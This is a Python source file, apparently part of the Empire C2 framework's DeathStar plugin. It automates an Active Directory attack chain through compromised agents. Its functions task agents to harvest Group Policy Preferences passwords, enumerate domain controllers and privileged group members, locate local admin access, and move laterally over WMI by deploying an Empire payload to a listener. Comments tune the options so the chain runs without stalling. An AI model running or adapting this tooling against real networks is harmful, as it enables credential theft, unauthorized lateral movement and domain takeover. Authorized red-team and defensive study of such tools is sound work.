from empire.server.api.v2.agent.agent_task_dto import ModulePostRequest


class DeathStarTasks:
    def __init__(self, main_menu):
        self.main_menu = main_menu

    def run_get_gpp(self, db, session_id):
        agent = self.main_menu.agentsv2.get_by_id(db, session_id)
        params = {
            "Agent": session_id,
            "OutputFunction": "Out-String",
        }
        module_post_request = ModulePostRequest(
            module_id="powershell_privesc_gpp", options=params
        )
        res, err = self.main_menu.agenttasksv2.create_task_module(
            db, agent, module_post_request, None
        )

        if not err:
            return res.id
        else:
            return False

    def run_get_domain_controller(self, db, session_id):
        agent = self.main_menu.agentsv2.get_by_id(db, session_id)
        params = {
            "Agent": session_id,
            "OutputFunction": "Out-String",
        }
        module_post_request = ModulePostRequest(
            module_id="powershell_situational_awareness_network_powerview_get_domain_controller",
            options=params,
        )
        res, err = self.main_menu.agenttasksv2.create_task_module(
            db, agent, module_post_request, None
        )

        if not err:
            return res.id
        else:
            return False

    def run_get_group_member(self, db, sid, session_id):
        agent = self.main_menu.agentsv2.get_by_id(db, session_id)
        params = {
            "Agent": session_id,
            "OutputFunction": "Out-String",
            "Identity": sid,
            "Recurse": "True",
        }
        module_post_request = ModulePostRequest(
            module_id="powershell_situational_awareness_network_powerview_get_group_member",
            options=params,
        )
        res, err = self.main_menu.agenttasksv2.create_task_module(
            db, agent, module_post_request, None
        )

        if not err:
            return res.id
        else:
            return False

    def run_find_localadmin(self, db, session_id, domain_controller, domain):
        agent = self.main_menu.agentsv2.get_by_id(db, session_id)
        params = {
            "Agent": session_id,
            "OutputFunction": "Out-String",
            "ComputerDomain": domain,
            "Server": domain_controller,
            "ServerTimeLimit": "60",
        }
        module_post_request = ModulePostRequest(
            module_id="powershell_situational_awareness_network_powerview_find_localadmin_access",
            options=params,
        )
        res, err = self.main_menu.agenttasksv2.create_task_module(
            db, agent, module_post_request, None
        )

        if not err:
            return res.id
        else:
            return False

    def run_invoke_wmi(self, db, session_id, listener, computer_name):
        agent = self.main_menu.agentsv2.get_by_id(db, session_id)
        params = {
            "Agent": session_id,
            # Payload and Credentials are internal options, so
            # convert_module_options drops them entirely and their defaults are
            # never injected into params -- but evaluate_dependencies still
            # gates on the raw params dict. Without them, Listener (depends_on
            # Payload in ['Empire']) and UserName/Password (depends_on
            # Credentials in ['Manual']) silently fall back to their ''
            # defaults, and invoke_wmi then raises ModuleValidationException
            # "Listener or Command required" -- stalling the whole chain.
            "Payload": "Empire",
            "Credentials": "Manual",
            "Listener": listener,
            "UserName": "",
            "Password": "",
            "OutputFunction": "Out-String",
            "ComputerName": computer_name,
            # Obfuscate gates ObfuscateCommand, so with Obfuscate False the
            # command below is unused and the module falls back to this same
            # default. Kept so the pair stays correct if it's ever turned on.
            "Obfuscate": "False",
            "ObfuscateCommand": r"Token\All\1",
            "ProxyCreds": "default",
            "Proxy": "default",
            "UserAgent": "default",
        }
        module_post_request = ModulePostRequest(
            module_id="powershell_lateral_movement_invoke_wmi",
            options=params,
        )
        res, err = self.main_menu.agenttasksv2.create_task_module(
            db, agent, module_post_request, None
        )

        if not err:
            return res.id
        else:
            print("Error")
            return False
